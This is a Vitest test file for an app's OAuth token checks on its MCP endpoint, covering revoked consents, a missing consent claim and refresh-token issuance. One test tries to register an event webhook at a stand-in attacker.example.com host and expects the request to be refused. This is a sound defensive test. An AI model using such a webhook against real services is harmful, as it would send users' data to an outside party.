import { createHash } from 'node:crypto';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { newId } from '../../shared/id.ts';
import { app } from '../app.ts';
import { authorizeClient } from '../features/mcp-clients/__tests__/fixtures.ts';
import { revokeClient } from '../features/mcp-clients/service.ts';
import { mcpEventSubscriptions } from '../features/mcp-events/schema.ts';
import { CONSENT_ID_CLAIM, getAuth, MCP_RESOURCE } from '../lib/auth.ts';
import { db } from '../lib/db/client.ts';
import {
  oauthClientResources,
  oauthClients,
  oauthRefreshTokens,
  oauthResources,
} from '../lib/db/oauth-schema.ts';
import { clearTables, resetUsers } from '../lib/db/test-db.ts';

const CLIENT = 'https://claude.example.com/oauth/client.json';

/**
 * oauth-provider が MCP クライアントに渡すのと同じ形のアクセストークン（JWT）を、LifeHub の鍵で署名して作る。
 * consentId は発行のもとになった許可（同意の id）。省くとそのクレームを持たないトークンになる
 */
async function accessTokenFor(userId: string, consentId?: string): Promise<string> {
  const auth = await getAuth();
  const { baseURL } = await auth.$context;
  const now = Math.floor(Date.now() / 1000);
  const { token } = await auth.api.signJWT({
    body: {
      payload: {
        sub: userId,
        azp: CLIENT,
        aud: MCP_RESOURCE,
        iss: baseURL,
        iat: now,
        exp: now + 3600,
        scope: 'openid',
        ...(consentId && { [CONSENT_ID_CLAIM]: consentId }),
      },
    },
  });
  return token;
}

function mcpRequest(token: string, method: string, params?: Record<string, unknown>) {
  return app.request('/api/mcp', {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      'content-type': 'application/json',
      accept: 'application/json, text/event-stream',
      'mcp-protocol-version': '2025-06-18',
    },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
}

const listTools = (token: string) => mcpRequest(token, 'tools/list');

/** JWT の本体（クレーム）を読む（署名は確かめない） */
function claimsOf(jwt: string): Record<string, unknown> {
  return JSON.parse(Buffer.from(jwt.split('.')[1] ?? '', 'base64url').toString());
}

/**
 * クライアントが持つリフレッシュトークンを、oauth-provider が保存するのと同じ形（ハッシュ）で書き、
 * クライアントに渡す値を返す
 */
async function issueRefreshToken(userId: string): Promise<string> {
  const raw = newId();
  const now = new Date();
  await db.insert(oauthRefreshTokens).values({
    id: newId(),
    token: createHash('sha256').update(raw).digest('base64url'),
    clientId: CLIENT,
    userId,
    resources: [MCP_RESOURCE],
    scopes: ['offline_access'],
    createdAt: now,
    expiresAt: new Date(now.getTime() + 60 * 60 * 1000),
  });
  return raw;
}

/** リフレッシュトークンでアクセストークンを取り直す（MCP クライアントがトークンの期限ごとにする要求） */
function refresh(refreshToken: string) {
  return app.request('/api/auth/oauth2/token', {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      client_id: CLIENT,
      refresh_token: refreshToken,
      resource: MCP_RESOURCE,
    }).toString(),
  });
}

describe('MCP のアクセストークンの検証', () => {
  let userId: string;
  beforeEach(async () => {
    await clearTables();
    ({ userId } = await resetUsers());
    // requireMcpAuth が公開鍵を取りに行く先（このアプリ自身）へ、ネットワークを通さずに送る
    const fetch = globalThis.fetch;
    vi.spyOn(globalThis, 'fetch').mockImplementation((input, init) =>
      String(input instanceof Request ? input.url : input).endsWith('/api/auth/jwks')
        ? Promise.resolve(app.request('/api/auth/jwks'))
        : fetch(input, init),
    );
  });
  afterEach(() => vi.restoreAllMocks());

  it('検証に使う公開鍵の組は、CDN に持たせて関数を起こさずに返す', async () => {
    const res = await app.request('/api/auth/jwks');
    expect(res.status).toBe(200);
    expect(res.headers.get('vercel-cdn-cache-control')).toContain('max-age=86400');
    expect(((await res.json()) as { keys: unknown[] }).keys).toBeInstanceOf(Array);
  });

  it('期限内のトークンでも、許可を失効したクライアントからの要求は 401 と WWW-Authenticate で断る', async () => {
    const consentId = await authorizeClient(userId, CLIENT);
    const token = await accessTokenFor(userId, consentId);
    expect((await listTools(token)).status).toBe(200);

    await revokeClient(consentId, userId);

    const res = await listTools(token);
    expect(res.status).toBe(401);
    expect(res.headers.get('www-authenticate')).toContain(
      '/.well-known/oauth-protected-resource/api/mcp',
    );
  });

  it('失効した許可のトークンは、同じ秒のうちに許可し直しても通さず、新しい許可のトークンは通す', async () => {
    vi.useFakeTimers({ now: new Date('2026-10-09T12:00:00.000Z'), toFake: ['Date'] });
    const revoked = await authorizeClient(userId, CLIENT);
    const oldToken = await accessTokenFor(userId, revoked);
    await revokeClient(revoked, userId);
    vi.setSystemTime(new Date('2026-10-09T12:00:00.500Z'));
    const current = await authorizeClient(userId, CLIENT);
    const newToken = await accessTokenFor(userId, current);
    vi.useRealTimers();

    expect((await listTools(oldToken)).status).toBe(401);
    expect((await listTools(newToken)).status).toBe(200);
  });

  it('発行のもとの許可を持たないトークンは、そのクライアントを許可していても通さない', async () => {
    await authorizeClient(userId, CLIENT);
    expect((await listTools(await accessTokenFor(userId))).status).toBe(401);
  });

  it('通さないトークンでは、MCP Events の購読を残さない', async () => {
    const revoked = await authorizeClient(userId, CLIENT);
    const oldToken = await accessTokenFor(userId, revoked);
    await revokeClient(revoked, userId);
    await authorizeClient(userId, CLIENT, { subscribe: false });

    const res = await mcpRequest(oldToken, 'events/subscribe', {
      name: 'memo.changed',
      delivery: { mode: 'webhook', url: 'https://attacker.example.com/hook', secret: 'whsec_x' },
    });

    expect(res.status).toBe(401);
    expect(await db.select().from(mcpEventSubscriptions)).toEqual([]);
  });

  describe('発行', () => {
    beforeEach(async () => {
      // 公開クライアント（PKCE とリフレッシュトークンだけで認可を受ける MCP クライアント）として、MCP を宛先に登録する
      await db.insert(oauthClients).values({
        id: newId(),
        clientId: CLIENT,
        redirectUris: ['https://claude.example.com/callback'],
        tokenEndpointAuthMethod: 'none',
        grantTypes: ['authorization_code', 'refresh_token'],
        responseTypes: ['code'],
        scopes: ['offline_access'],
      });
      // MCP の宛先は better-auth が起動時に書くが、テストの前に表を空けるので書き直す
      await db
        .insert(oauthResources)
        .values({ id: newId(), identifier: MCP_RESOURCE, name: 'LifeHub' })
        .onConflictDoNothing();
      await db
        .insert(oauthClientResources)
        .values({ id: newId(), clientId: CLIENT, resourceId: MCP_RESOURCE });
    });

    it('アクセストークンに、発行のもとになった許可（同意の id）を入れ、そのトークンで MCP を使える', async () => {
      const consentId = await authorizeClient(userId, CLIENT, { subscribe: false });
      const res = await refresh(await issueRefreshToken(userId));
      expect(res.status).toBe(200);
      const { access_token } = (await res.json()) as { access_token: string };

      expect(claimsOf(access_token)[CONSENT_ID_CLAIM]).toBe(consentId);
      expect((await listTools(access_token)).status).toBe(200);
    });

    it('許可が無ければ（失効した後に残ったリフレッシュトークンなど）、アクセストークンを発行しない', async () => {
      const res = await refresh(await issueRefreshToken(userId));
      expect(res.status).toBe(400);
      expect(await res.json()).toMatchObject({ error: 'invalid_grant' });
    });
  });
});
